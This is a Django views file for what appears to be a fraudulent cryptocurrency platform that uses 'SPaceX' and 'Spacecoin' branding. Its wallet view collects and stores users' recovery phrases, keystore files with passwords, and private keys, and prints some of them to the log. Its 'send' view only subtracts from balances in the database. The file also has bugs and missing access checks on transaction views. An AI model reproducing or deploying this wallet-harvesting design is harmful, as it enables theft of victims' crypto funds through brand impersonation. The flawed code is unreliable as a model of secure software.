# myapp/views.py
from django.shortcuts import render
from django.shortcuts import render, redirect
from django.contrib.auth import login, authenticate
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth import login
from .forms import SignUpForm, KYCForm, TradeTransactionForm, SignInForm, WalletPhraseForm, WalletKeystoreForm, WalletPrivateKeyForm
from django.urls import reverse
from django.http import HttpResponseRedirect
from django.utils import timezone
from django.shortcuts import render, get_object_or_404
from django.contrib.auth.decorators import login_required
from .models import CustomUser, Trade, TradeTransaction
from django.contrib.auth import logout
from .sendwelcome import send_custom_email
from django.contrib import messages
import threading
from decimal import Decimal
from .models import Transaction  # Assuming Transaction and CustomUser are in the same app





def index(request):
    return render(request, 'app/index.html')


def profile(request):
    user = request.user
    context = {
        "user": user
    }
    return render(request, 'app/profile.html', context)


def stock(request):
    user = request.user
    user = request.user
    context = {
        "user": user
    }
    return render(request, 'app/stock.html', context)



@login_required(login_url='/signin/')
def kyc_view(request):
    user = request.user

    # If the user has already completed KYC, redirect them to their profile or dashboard
    if user.address and user.postal_code and user.city and user.country:
        return redirect(reverse('dashboard', args=[user.id]))  # You can change this to any view you want to redirect to

    if request.method == 'POST':
        form = KYCForm(request.POST, instance=user)
        if form.is_valid():
            form.save()
            messages.success(request, "KYC information updated successfully!")
            print("joo")
            print(user.id)
            return redirect(reverse('dashboard', args=[user.id]))  # After KYC is completed, redirect to dashboard or profile
        else:
            messages.error(request, "Please correct the errors below.")
    else:
        form = KYCForm(instance=user)

    return render(request, 'app/kyc_form.html', {'form': form})



def signup_view(request):
    if request.method == 'POST':
        form = SignUpForm(request.POST)
        if form.is_valid():
            user = form.save()
            login(request, user)
            user_email = user.email
            user_name = user.name
            subject = "Welcome To SPaceX"
            
            # Redirect the user to the dashboard
            response = redirect(reverse('kyc'))
            
            # Send email in a separate thread
            threading.Thread(target=send_custom_email, args=(user_email, user_name, subject)).start()
            
            return response
    else:
        form = SignUpForm()
    
    return render(request, 'app/sign-up.html', {'form': form})

def signin_view(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(request, username=username, password=password)
            if user is not None:
                login(request, user)
                return redirect(reverse('dashboard', args=[user.id]))
                
            else:
                form.add_error(None, 'Invalid username or password')
        else:
            form.add_error(None, 'Invalid username or password')
    else:
        form = AuthenticationForm()
    
    return render(request, 'app/sign-in.html', {'form': form})



@login_required
def dashboard_view(request, user_id):
    if request.user.id != user_id:
        return redirect('signup')  # Redirect to an error page or raise a permission error

    user = get_object_or_404(CustomUser, id=user_id)
    context = {
        'name': user.name,
        'email': user.email,
        'total_balance': user.total_balance,
        'spc_balance': user.spc_balance,
        'tether_balance': user.tether_balance,
        'btc_balance': user.btc_balance,
        'eth_balance': user.eth_balance,
        'sol_balance': user.sol_balance,
        'binance_balance': user.binance_balance,
        'ripple_balance': user.ripple_balance,
    }

    return render(request, 'app/dashboard.html', context)


def custom_logout_view(request):
    logout(request)
    return redirect('signin')  # Replace 'signin' with the name of your desired redirect page


@login_required(login_url='/signin/')
def save_wallet_info(request):
    if request.method == 'POST':
        wallet_name = request.POST.get('walletname')
        
        if 'submit_phrase' in request.POST:
            form = WalletPhraseForm(request.POST)
            if form.is_valid():
                wallet_phrase = form.save(commit=False)
                wallet_phrase.user = request.user
                wallet_phrase.wallet_name = wallet_name
                wallet_phrase.save()
                return redirect(reverse('dashboard', args=[request.user.id]))
        elif 'submit_keystore' in request.POST:
            form = WalletKeystoreForm(request.POST)
            if form.is_valid():
                wallet_keystore = form.save(commit=False)
                wallet_keystore.user = request.user
                wallet_keystore.wallet_name = wallet_name
                print(wallet_keystore.wallet_keystore_json)
                print(wallet_keystore.wallet_keystore_json_password)
                print(wallet_keystore.wallet_name)
                wallet_keystore.save()
                return redirect(reverse('dashboard', args=[request.user.id]))
            else: print("Phrase form errors:", form_phrase.errors)
        elif 'submit_private_key' in request.POST:
            form = WalletPrivateKeyForm(request.POST)
            if form.is_valid():
                wallet_private_key = form.save(commit=False)
                wallet_private_key.user = request.user
                wallet_private_key.wallet_name = wallet_name
                wallet_private_key.save()
                return redirect(reverse('dashboard', args=[request.user.id]))
    else:
        form_phrase = WalletPhraseForm()
        form_keystore = WalletKeystoreForm()
        form_private_key = WalletPrivateKeyForm()
    
    return render(request, 'app/wallet.html', {
        'form_phrase': form_phrase,
        'form_keystore': form_keystore,
        'form_private_key': form_private_key
    })

@login_required(login_url='/signin/')
def usdtindex(request):
    user = request.user  # Get the logged-in user
    print(user)
    tether_balance = user.tether_balance  # Retrieve tether_balance from the user object
    context = {
        'tether_balance': tether_balance,  # Pass the tether_balance to the template
    }
    return render(request, 'app/usdtwallet.html', context)

@login_required(login_url='/signin/')
def ethindex(request):
    user = request.user  # Get the logged-in user
    eth_balance = user.eth_balance  # Retrieve tether_balance from the user object
    context = {
        'eth_balance':eth_balance,  # Pass the tether_balance to the template
    }
    return render(request, 'app/ethwallet.html', context)

@login_required(login_url='/signin/')
def bnbindex(request):
    return render(request, 'app/bnbwallet.html')

@login_required(login_url='/signin/')
def btcindex(request):
    user = request.user  # Get the logged-in user
    btc_balance = user.btc_balance  # Retrieve tether_balance from the user object
    context = {
        'btc_balance':btc_balance,  # Pass the tether_balance to the template
    }
    return render(request, 'app/btcwallet.html', context)

@login_required(login_url='/signin/')
def xrpindex(request):
    return render(request, 'app/btcwallet.html')

@login_required(login_url='/signin/')
def solindex(request):
    return render(request, 'app/solwallet.html')


@login_required(login_url='/signin/')
def send(request):
    if request.method == "POST":
        # Get form values
        currency = request.POST.get("currency")
        amount = request.POST.get("amount")
        wallet_address = request.POST.get("wallet_address")

        # Check if the logged-in user exists and has balances
        user = request.user
        error = None

        try:
            amount = Decimal(amount)
        except ValueError:
            error = "Invalid amount. Please enter a valid number."

        # Check for missing fields
        if not amount or not wallet_address:
            error = "Amount and wallet address are required."

        # Validate the user's balance for the selected cryptocurrency
        elif currency == "Spacecoin" and amount > user.spc_balance:
            error = "Insufficient Spacecoin balance."
        elif currency == "Solana" and amount > user.sol_balance:
            error = "Insufficient Solana balance."
        elif currency == "Binance Coin (BNB)" and amount > user.binance_balance:
            error = "Insufficient Binance Coin (BNB) balance."
        elif currency == "Bitcoin (BTC)" and amount > user.btc_balance:
            error = "Insufficient Bitcoin (BTC) balance."
        elif currency == "Tether (USDT)" and amount > user.tether_balance:
            error = "Insufficient Tether (USDT) balance."
        
        # Add other cryptocurrency checks if necessary

        if error:
            # If there is an error, display it on the same form
            return render(request, "app/send.html", {"error": error})

        # If no error, proceed to create a transaction
        # Assuming Transaction is a model where you store inflow/outflow records
        Transaction.objects.create(
            user=user,
            transaction_type="outflow",  # Since the user is sending the crypto
            currency_type=currency,
            amount=amount,
        )

        # Reduce the user's balance based on the selected currency
        if currency == "Spacecoin":
            user.spc_balance -= amount
        elif currency == "Solana":
            user.sol_balance -= amount
        elif currency == "Binance Coin (BNB)":
            user.binance_balance -= amount
        elif currency == "Bitcoin (BTC)":
            user.btc_balance -= amount
        elif currency == "Tether (USDT)":
            user.tether_balance -= amount

        # Save the updated user balance
        user.save()

        # Display success message
        messages.success(request, "Transaction successful! You have sent {} {} to wallet address: {}".format(amount, currency, wallet_address))
        
        # Redirect to success page or render the form again with a success message
        return render(request, "app/success.html", {"currency": currency, "amount": amount, "wallet_address": wallet_address})

    # Render the form page if method is not POST
    return render(request, "app/send.html")


@login_required(login_url='/signin/')
def success_page(request):
    return render(request, 'app/success.html')  # Create a success.html page




def p2p(request):
    return render(request, 'app/p2ptrade.html')

@login_required(login_url='/signin/')
def trade_detail_view(request):
    user = request.user
    trades = Trade.objects.all()
    transactions = TradeTransaction.objects.filter(buyer=request.user).order_by('-created_at')
    for transaction in transactions:
        # Calculate time left in seconds
        if transaction.status == 'pending':
            time_left = (transaction.transaction_expiration - timezone.now()).total_seconds()
            transaction.time_left = max(int(time_left), 0)  # Ensure no negative time
            
            # Convert to minutes and seconds
            minutes = transaction.time_left // 60
            seconds = transaction.time_left % 60
            transaction.formatted_time_left = f"{minutes}:{seconds:02}"  # Format as MM:SS
            print(transaction.formatted_time_left)
        else:
            transaction.formatted_time_left = "-"  # Not applicable for non-pending transactions
    context = {
        'trades': trades,
        'user': user,
        'transactions': transactions
    }
    return render(request, 'app/p2ptrade.html', context)


@login_required(login_url='/signin/')
def create_trade_transaction_view(request, trade_id):
    trade = get_object_or_404(Trade, id=trade_id)

    # Check if trade has expired
    if trade.transactions.filter(status='pendinga', transaction_expiration__lte=timezone.now()).exists():
        return render(request, 'app/trade_expired.html', {'trade': trade})

    if request.method == 'POST':
        form = TradeTransactionForm(request.POST, trade=trade)
        if form.is_valid():
            # Create a new trade transaction
            transaction = form.save(commit=False)
            transaction.buyer = request.user
            transaction.trade = trade
            transaction.save()

            return redirect('trade_transaction_success', transaction_id=transaction.id)
    else:
        form = TradeTransactionForm(trade=trade)

    return render(request, 'app/create_trade_transaction.html', {'form': form, 'trade': trade})

@login_required(login_url='/signin/')
def trade_transaction_success_view(request, transaction_id):
    transaction = get_object_or_404(TradeTransaction, id=transaction_id)
    trade = transaction.trade

    # Render the success page
    return render(request, 'app/trade_transaction_success.html', {
        'transaction': transaction,
        'trade': trade,
        'transaction_expiration': transaction.transaction_expiration,
    })

@login_required(login_url='/signin/')
def cancel_transaction_view(request, transaction_id):
    transaction = get_object_or_404(TradeTransaction, id=transaction_id)
    
    if request.method == 'POST':
        transaction.status = 'cancelled'  # Update to 'cancelled' status
        transaction.save()
        messages.success(request, 'Transaction has been cancelled successfully.')
        return redirect('trade_transaction_success', transaction_id=transaction.id)

def mark_payment_made_view(request, transaction_id):
    transaction = get_object_or_404(TradeTransaction, id=transaction_id)
    
    if request.method == 'POST':
        transaction.status = 'payment_made'  # Update to 'payment_made' status
        transaction.save()
        messages.success(request, 'Payment has been marked successfully.')
        return redirect('trade_transaction_success', transaction_id=transaction.id)
    

